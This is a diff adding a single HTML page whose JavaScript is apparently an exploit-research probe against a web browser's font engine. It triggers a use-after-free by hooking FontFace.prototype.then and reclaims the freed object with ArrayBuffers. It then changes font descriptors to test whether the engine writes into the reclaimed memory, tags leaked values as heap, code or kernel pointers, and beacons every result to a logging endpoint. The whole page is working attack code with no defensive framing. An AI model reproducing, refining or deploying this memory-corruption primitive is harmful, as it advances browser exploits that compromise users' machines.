@@ -1,0 +1,292 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1109</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}#log{white-space:pre-wrap;word-break:break-all}.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}.win{color:#0f0;font-weight:bold;font-size:14px}.warn{color:#ff6}</style>
+</head><body>
+<div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);L.scrollTop=L.scrollHeight;}
+function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
+function hex64(v){if(typeof v==='bigint')return'0x'+v.toString(16);return'0x0';}
+
+B('P1109-BOOT','');
+log('phase','=== P1109: FONTFACE DESCRIPTOR WRITE-BACK ORACLE ===');
+log('info','Goal: Mutating FontFace descriptors might WRITE to the UAF buffer');
+log('info','If setters update the freed CSSFontFace, new data appears in buffer');
+
+var SIZES=[64,96,128,160,192,224,256,320,384,512,768,1024,2048];
+var K=8;
+
+// ============================================================
+// FontFace UAF + reclaim (proven)
+// ============================================================
+var st1=document.createElement('style');
+st1.textContent="@font-face{font-family:s0;src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(st1);
+var f0=new FontFace('f0','local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(f0);void f0.loaded;
+
+var fired=false,map1=null,buf=null,ptrs=null,idx=-1,patched=false;
+var jsFont=null;
+
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+  if(fired)return undefined;fired=true;
+  jsFont=this;
+  if(st1){st1.remove();st1=null;}
+  try{document.fonts.delete(this);}catch(e){}
+  document.body.offsetHeight;
+  map1=[];
+  for(var si=0;si<SIZES.length;si++){
+    var sz=SIZES[si];
+    for(var k=0;k<K;k++){map1.push({size:sz,ab:new ArrayBuffer(sz),idx:si*K+k});}
+  }
+  try{document.fonts.check('1em s0');}catch(e){}
+  return undefined;
+},set:function(){}});
+document.fonts.load('1em f0, s0','AB').then(function(){},function(){});
+
+for(var t=10;t<=200;t+=5){(function(ms){setTimeout(function(){
+  if(patched||!map1)return;
+  for(var bi=32;bi<40;bi++){
+    if(!map1[bi])continue;
+    var b=new BigUint64Array(map1[bi].ab);
+    var nz=0;for(var q=0;q<b.length;q++)if(b[q]!==0n)nz++;
+    if(nz>0&&!patched){
+      patched=true;buf=b;idx=bi;
+      ptrs=[];
+      for(var q=0;q<b.length;q++)if(b[q]!==0n)ptrs.push({off:q*8,val:b[q]});
+      b[0]=0x100n;
+      B('P1109-UAF','buf='+bi+'|ms='+ms+'|'+ptrs.map(function(p){return'+'+hex64(p.off)+'='+hex64(p.val);}).join(','));
+    }
+  }
+},ms);})(t);}
+
+setTimeout(function(){
+  if(!patched||!jsFont){B('P1109-NOHIT','');return;}
+
+  // Snapshot buffer BEFORE mutations
+  var before=[];
+  for(var q=0;q<buf.length;q++)before.push(buf[q]);
+  B('P1109-SNAP','before=done|len='+buf.length);
+
+  // ============================================================
+  // PHASE A: Set unicodeRange — this is a CSS value descriptor
+  // The setter might write a parsed CSSValueList into the CSSFontFace
+  // ============================================================
+  log('phase','--- PHASE A: Set unicodeRange ---');
+  var aErr='';
+  try{
+    jsFont.unicodeRange='U+0-FFFF';
+    aErr='ok';
+  }catch(e){aErr='ERR:'+e.message;}
+  B('P1109-A-SET',aErr);
+
+  // Check what changed in buffer
+  var aChanges=[];
+  for(var q=0;q<buf.length;q++){
+    if(buf[q]!==before[q]){
+      aChanges.push('+'+q*8+'='+hex64(before[q])+'->'+hex64(buf[q]));
+      before[q]=buf[q]; // update snapshot
+    }
+  }
+  B('P1109-A-DIFF',aChanges.length>0?aChanges.join('|'):'none');
+  if(aChanges.length>0){
+    log('win','A: Buffer changed! '+aChanges.join(', '));
+  }else{
+    log('info','A: No buffer changes from unicodeRange set');
+  }
+
+  // Read back the property
+  var aRead='???';
+  try{aRead=jsFont.unicodeRange;}catch(e){aRead='ERR:'+e.message;}
+  B('P1109-A-READ',aRead);
+
+  // ============================================================
+  // PHASE B: Set weight — might write weight value struct
+  // ============================================================
+  log('phase','--- PHASE B: Set weight ---');
+  var bErr='';
+  try{
+    jsFont.weight='bold';
+    bErr='ok';
+  }catch(e){bErr='ERR:'+e.message;}
+  B('P1109-B-SET',bErr);
+
+  var bChanges=[];
+  for(var q=0;q<buf.length;q++){
+    if(buf[q]!==before[q]){
+      bChanges.push('+'+q*8+'='+hex64(before[q])+'->'+hex64(buf[q]));
+      before[q]=buf[q];
+    }
+  }
+  B('P1109-B-DIFF',bChanges.length>0?bChanges.join('|'):'none');
+  if(bChanges.length>0)log('win','B: Buffer changed! '+bChanges.join(', '));
+  else log('info','B: No buffer changes from weight set');
+
+  // ============================================================
+  // PHASE C: Set style — might write style descriptor
+  // ============================================================
+  log('phase','--- PHASE C: Set style ---');
+  var cErr='';
+  try{
+    jsFont.style='italic';
+    cErr='ok';
+  }catch(e){cErr='ERR:'+e.message;}
+  B('P1109-C-SET',cErr);
+
+  var cChanges=[];
+  for(var q=0;q<buf.length;q++){
+    if(buf[q]!==before[q]){
+      cChanges.push('+'+q*8+'='+hex64(before[q])+'->'+hex64(buf[q]));
+      before[q]=buf[q];
+    }
+  }
+  B('P1109-C-DIFF',cChanges.length>0?cChanges.join('|'):'none');
+  if(cChanges.length>0)log('win','C: Buffer changed! '+cChanges.join(', '));
+  else log('info','C: No buffer changes from style set');
+
+  // ============================================================
+  // PHASE D: Set display — font-display descriptor
+  // ============================================================
+  log('phase','--- PHASE D: Set display ---');
+  var dErr='';
+  try{
+    jsFont.display='swap';
+    dErr='ok';
+  }catch(e){dErr='ERR:'+e.message;}
+  B('P1109-D-SET',dErr);
+
+  var dChanges=[];
+  for(var q=0;q<buf.length;q++){
+    if(buf[q]!==before[q]){
+      dChanges.push('+'+q*8+'='+hex64(before[q])+'->'+hex64(buf[q]));
+      before[q]=buf[q];
+    }
+  }
+  B('P1109-D-DIFF',dChanges.length>0?dChanges.join('|'):'none');
+  if(dChanges.length>0)log('win','D: Buffer changed! '+dChanges.join(', '));
+  else log('info','D: No buffer changes from display set');
+
+  // ============================================================
+  // PHASE E: Set family name — the most invasive mutation
+  // Changing the family might trigger font set re-indexing
+  // ============================================================
+  log('phase','--- PHASE E: Set family ---');
+  var eErr='';
+  try{
+    jsFont.family='f_mutated';
+    eErr='ok';
+  }catch(e){eErr='ERR:'+e.message;}
+  B('P1109-E-SET',eErr);
+
+  var eChanges=[];
+  for(var q=0;q<buf.length;q++){
+    if(buf[q]!==before[q]){
+      eChanges.push('+'+q*8+'='+hex64(before[q])+'->'+hex64(buf[q]));
+      before[q]=buf[q];
+    }
+  }
+  B('P1109-E-DIFF',eChanges.length>0?eChanges.join('|'):'none');
+  if(eChanges.length>0)log('win','E: Buffer changed! '+eChanges.join(', '));
+  else log('info','E: No buffer changes from family set');
+
+  // ============================================================
+  // PHASE F: Set featureSettings and variationSettings
+  // These are complex CSS values that might write pointer data
+  // ============================================================
+  log('phase','--- PHASE F: Feature/Variation settings ---');
+  var fErr1='',fErr2='';
+  try{jsFont.featureSettings='"liga" 1';fErr1='ok';}catch(e){fErr1='ERR:'+e.message;}
+  B('P1109-F1-SET',fErr1);
+
+  var f1Changes=[];
+  for(var q=0;q<buf.length;q++){
+    if(buf[q]!==before[q]){
+      f1Changes.push('+'+q*8+'='+hex64(before[q])+'->'+hex64(buf[q]));
+      before[q]=buf[q];
+    }
+  }
+  B('P1109-F1-DIFF',f1Changes.length>0?f1Changes.join('|'):'none');
+
+  try{jsFont.variationSettings='"wght" 700';fErr2='ok';}catch(e){fErr2='ERR:'+e.message;}
+  B('P1109-F2-SET',fErr2);
+
+  var f2Changes=[];
+  for(var q=0;q<buf.length;q++){
+    if(buf[q]!==before[q]){
+      f2Changes.push('+'+q*8+'='+hex64(before[q])+'->'+hex64(buf[q]));
+      before[q]=buf[q];
+    }
+  }
+  B('P1109-F2-DIFF',f2Changes.length>0?f2Changes.join('|'):'none');
+
+  // ============================================================
+  // PHASE G: Re-add to document.fonts and trigger load
+  // This might force the engine to re-initialize the CSSFontFace
+  // which would write initialization data into our buffer
+  // ============================================================
+  log('phase','--- PHASE G: Re-add + trigger load ---');
+  try{document.fonts.add(jsFont);}catch(e){}
+
+  var gSnap=[];
+  for(var q=0;q<buf.length;q++)gSnap.push(buf[q]);
+
+  try{
+    document.fonts.load('1em f_mutated','TEST').then(function(r){
+      var gChanges=[];
+      for(var q=0;q<buf.length;q++){
+        if(buf[q]!==gSnap[q]){
+          gChanges.push('+'+q*8+'='+hex64(gSnap[q])+'->'+hex64(buf[q]));
+        }
+      }
+      B('P1109-G-LOAD','faces='+r.length+'|changes='+(gChanges.length>0?gChanges.join(','):'none'));
+      if(gChanges.length>0)log('win','G: Load wrote to buffer! '+gChanges.join(', '));
+      else log('info','G: fonts.load resolved, no buffer writes');
+    },function(e){
+      B('P1109-G-LOAD','rejected|'+e.message);
+    });
+  }catch(e){
+    B('P1109-G-LOAD','ERR:'+e.message);
+  }
+
+  // ============================================================
+  // PHASE H: Full buffer diff — what changed across ALL mutations?
+  // Look for any new pointer-shaped values
+  // ============================================================
+  setTimeout(function(){
+    log('phase','--- PHASE H: Full buffer analysis ---');
+    var orig=[];
+    // We patched +0x0 to 0x100 at reclaim. The original was 0x1.
+    // Check ALL qwords for pointer-shaped values
+    var allPtrs=[];
+    for(var q=0;q<buf.length;q++){
+      var v=buf[q];
+      if(v!==0n){
+        var hi=Number(v>>32n);
+        var lo=Number(v&0xFFFFFFFFn);
+        var isHeap=(hi>=0x100&&hi<=0x1FF);
+        var isCode=(hi>=0x200&&hi<=0x7FF);
+        var isKernel=(hi>=0xFFFF8000);
+        var tag='';
+        if(isHeap)tag='HEAP';
+        else if(isCode)tag='CODE!';
+        else if(isKernel)tag='KERN!';
+        else if(v<0x10000n)tag='small';
+        else tag='???';
+        allPtrs.push('+'+q*8+'='+hex64(v)+'('+tag+')');
+      }
+    }
+    B('P1109-H-FINAL',allPtrs.join('|'));
+    if(allPtrs.length>0){
+      for(var i=0;i<allPtrs.length;i++){
+        var hasCode=allPtrs[i].indexOf('CODE')>=0;
+        log(hasCode?'win':'ptr',allPtrs[i]);
+      }
+    }
+
+    B('P1109-DONE','');
+    log('phase','=== P1109 COMPLETE ===');
+  },1000);
+
+},500);
+</script>
+</body></html>
